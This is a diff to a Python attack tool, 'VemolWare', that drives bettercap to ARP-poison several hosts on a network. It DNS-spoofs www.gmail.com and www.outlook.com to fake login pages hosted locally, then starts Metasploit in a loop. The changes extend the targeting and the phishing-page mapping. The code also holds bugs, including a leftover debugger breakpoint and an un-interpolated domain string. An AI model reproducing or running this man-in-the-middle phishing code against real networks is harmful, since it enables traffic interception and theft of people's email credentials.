@@ -8,8 +8,8 @@ from optparse import OptionParser
 
 
 DOMAIN_TARGET = {
-    '1': 'gmail-login.html',
-    '2': 'outlook-login.html',
+    '1': ['www.gmail.com', 'gmail-login.html'],
+    '2': ['www.outlook.com', 'outlook-login.html'],
 }
 
 LOCAL_IP = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
@@ -23,11 +23,10 @@ class VemolWare:
         #     sys.exit(1)
 
         # ------------ Main ------------
-        usage = 'Usage: %prog [-i interface] [-t target] host'
+        usage = 'Usage: %prog [-i interface] [-t target] host/s'
         parser = OptionParser(usage)
         parser.add_option('-i', dest='interface', help='Specify the interface to use')
-        parser.add_option('-t', dest='target', help='Specify a particular host to ARP poison')
-        parser.add_option('-m', dest='mode', default='req', help='Poisoning mode: requests (req) or replies (rep) [default: %default]')
+        parser.add_option('-t', dest='target', help='Comma separated list to hosts to ARP poison')
         (self.options, self.args) = parser.parse_args()
         
         # Check interface input is given
@@ -42,12 +41,14 @@ class VemolWare:
             print("[2] - Outlook.")
             print("[3] - Other.\n\n")
             self.option_domain = input("Selected option: ")
-            self.option_domain = DOMAIN_TARGET.get(self.option_domain, '')
+            import ipdb; ipdb.set_trace()
+            self.option_domain = DOMAIN_TARGET.get(self.option_domain, '')[0]
             if self.option_domain == 3:
                 new_domain = input("\n\nEnter your domain: ")
                 # TODO: wget para el domain
         except ValueError:
             print("Sorry, I didn't understand that.")
+            parser.print_help()
             sys.exit(0)
     
     def create_config_file_bettercap(self):
@@ -55,7 +56,7 @@ class VemolWare:
         file.write(f'set arp.spoof.targets {self.options.target}\n')
         file.write('arp.spoof on\n')
         file.write(f'set dns.spoof.address {LOCAL_IP}\n')
-        file.write('set dns.spoof.domains www.vemol2.com\n')
+        file.write('set dns.spoof.domains {self.option_domain}\n')
         file.write('dns.spoof on\n')
         file.close()
 
@@ -93,10 +94,11 @@ class VemolWare:
         os.system(command)
     
     def main(self):
-        self.create_config_file_bettercap()
-        self.bettercap()
-        self.flask_server()
-        self.start_metasploit()
+        while True:
+            self.create_config_file_bettercap()
+            self.bettercap()
+            self.flask_server()
+            self.start_metasploit()
 
 
 if __name__ == "__main__":
